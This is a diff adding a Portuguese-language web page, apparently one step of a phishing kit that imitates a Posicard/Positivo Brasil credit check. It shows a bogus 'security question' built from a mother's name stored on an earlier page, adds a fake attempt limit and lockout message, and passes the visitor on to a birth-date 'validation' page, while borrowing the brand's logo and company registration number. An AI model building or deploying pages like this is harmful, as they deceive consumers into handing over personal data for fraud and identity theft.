@@ -1,0 +1,185 @@
+
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+        .header {
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%,rgb(0, 73, 144) 54.8%, rgb(250, 99, 160) 93.4%);
+        color: white;
+        padding: 15px 0;
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: bold;
+        grid-area: top-bar;
+    }
+    .main-content {
+        max-width: 450px;
+        background-color: white;
+        text-align: center;
+        padding: 2rem 2rem 1rem 2rem;
+        border-radius: 10px;
+        box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+        margin: 0 auto;
+    }
+    .main-content h2 {
+        margin-bottom: 20px;
+    }
+    .btn-custom {
+        color: white;
+        border: none;
+        width: 100%;
+        margin-bottom: 10px;
+        background: radial-gradient(934px at 6% 39.5%, rgb(0, 173, 202) 0.2%, rgb(0, 73, 144) 54.8%, rgb(255, 0, 0) 93.4%);
+        font-weight: 600;
+        border-radius: 1rem;
+        padding: .75rem 3rem;
+        letter-spacing: .3px;
+        line-height: 1.15;
+    }
+    .btn-custom:hover{
+        color: black !important;
+        background-color: #00adca !important;
+        transform: scale(1.02) !important;
+    }
+    
+    .footer {
+        background-color: #ffffff;
+        border-top: solid 1px #e6dddd;
+        color: #000;
+        text-align: center;
+        width: 100%;
+        bottom: 0;
+        grid-area: footer;
+        border-bottom: solid 3px #e6007e;
+        padding: 2rem 0.5rem;
+        position: relative;
+        margin-top: 50px;
+    }
+    
+    #conclusao {
+        display: none; /* Esconde o elemento por padrão */
+    }
+    
+    #conclusao h4 {
+        color: green; /* Define a cor do texto */
+        font-weight: bold; /* Define o texto em negrito */
+    }
+    
+    .char {
+        border-top: solid px #00adca;
+        background-color: #00adca;
+        padding: 2px !important;
+    }/* End custom CSS */
+    </style>
+</head>
+
+<body>
+    
+    
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+    <div class="header">
+          <img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada">
+      </div>
+    
+     <div style="grid-area: content; padding: 0 1rem;">   
+        <div class="text-center mt-5">
+           <h3>Pergunta de segurança!</h3>
+            <p style="color: gray;">Responda essas perguntas para verificar seu crédito disponível.</p>
+        </div>
+    
+
+        <div class="main-content">
+            <div class="mb-3">
+                <h5 class="mb-3">Qual o nome correto da sua mae?</h5>
+                <button id="mae0" class="btn-custom" onclick="escolherMae(0)"></button>
+                <button id="mae1" class="btn-custom" onclick="escolherMae(1)"></button>
+                <button id="mae2" class="btn-custom" onclick="escolherMae(2)"></button>
+                <button id="mae3" class="btn-custom" onclick="escolherMae(3)"></button>
+                <button id="mae4" class="btn-custom" onclick="escolherMae(4)"></button>
+            </div>
+        </div>
+    </div>
+
+
+
+<script>
+    const mae = localStorage.getItem("posicard_mae");
+    if(!mae){ location.href='/log'; }
+    const maes = ["Maria da Silva", "Carmen Lucia dos Santos", "Ines Prado", "Paola Oliveira", "Larissa Abreu da Silva", "Leila dos Santos", "Manoela Tadeu Silva", "Rosi Goncalves", "Isabella Abreu", "Sophia Abraao", "Júlia da Silva", "Maria Cecília Goncalves"];
+    const randCerto = parseInt(Math.random() * 4);
+    const indexUsados = [];
+    var tentativas = 3;
+    
+    
+    for(var i = 0;i< 5;i++){
+        var maeEscolhidaStr = "";
+        if(i == randCerto){
+            maeEscolhidaStr = mae;
+        }else{
+            const maeEscolhida = parseInt(Math.random() * (maes.length - 1));
+            maeEscolhidaStr = maes.splice(maeEscolhida, 1);
+        }
+        document.getElementById("mae"+i).innerHTML = maeEscolhidaStr;
+        
+    }
+    
+    function escolherMae(id) {
+       if(id == randCerto){
+           location.href='/valida-nascimento';
+       }else{
+           if(tentativas == 0){
+               tentativas = 3;
+               alert("Voce usou todas suas tentativas e esta bloqueado por 1 minuto, caso erre mais uma vez sua conta será temporariamente bloqueada por segurança");
+           }else{
+               alert("Nome da mae incorreto, voce ainda tem "+tentativas+" tentativas!");
+               tentativas = tentativas - 1;
+           }
+       }
+    }
+</script>
+
+<script>
+    
+    function storeUTMParams() {
+    const params = new URLSearchParams(window.location.search);
+    const utmParams = {};
+
+    // Armazena apenas os parâmetros UTM
+    params.forEach((value, key) => {
+        if (key.startsWith('utm_')) {
+            utmParams[key] = value;
+        }
+    });
+
+    // Salva os parâmetros UTM em uma chave específica no localStorage
+    localStorage.setItem('utmParams', JSON.stringify(utmParams));
+
+    // Exibe no console o que foi armazenado no localStorage
+    console.log('Parâmetros UTM armazenados no localStorage:', utmParams);
+}
+
+window.onload = function() {
+    storeUTMParams();
+};
+</script>
+
+    <div class="footer py-4" id="footerChg">
+           © 2024 Positivo Brasil. CNPJ 35.380.502/0001-70 <br>
+         Todos os direitos reservados
+    </div>
+
+    <script type="rocketlazyloadscript" data-minify="1" src="https://positivobrasil.org/wp-content/cache/min/1/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js?ver=1724603965" defer></script>
+</body>
